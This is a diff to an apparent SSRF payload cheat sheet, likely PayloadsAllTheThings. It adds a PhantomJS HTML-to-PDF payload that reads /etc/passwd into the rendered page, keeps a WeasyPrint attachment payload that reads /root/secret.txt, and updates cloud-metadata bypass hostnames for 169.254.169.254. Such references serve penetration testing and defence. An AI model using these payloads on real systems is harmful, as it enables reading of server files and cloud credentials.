@@ -450,12 +450,24 @@ gopher://127.0.0.1:6379/_save
 
 ## SSRF exploiting PDF file
 
-![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.jpg?raw=true)
+![https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png)
 
 Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)
 
 ```powershell
 <link rel=attachment href="file:///root/secret.txt">
+```
+
+Example with PhantomJS 
+
+```js
+<script>
+    exfil = new XMLHttpRequest();
+    exfil.open("GET","file:///etc/passwd");
+    exfil.send();
+    exfil.onload = function(){document.write(this.responseText);}
+    exfil.onerror = function(){document.write('failed!')}
+</script>
 ```
 
 ## Blind SSRF
@@ -540,9 +552,7 @@ DNS record
 ```powershell
 http://instance-data
 http://169.254.169.254
-http://169.254.169.254.xip.io/
-http://1ynrnhl.xip.io/
-http://www.owasp.org.1ynrnhl.xip.io/
+http://169.254.169.254.nip.io/
 ```
 
 HTTP redirect
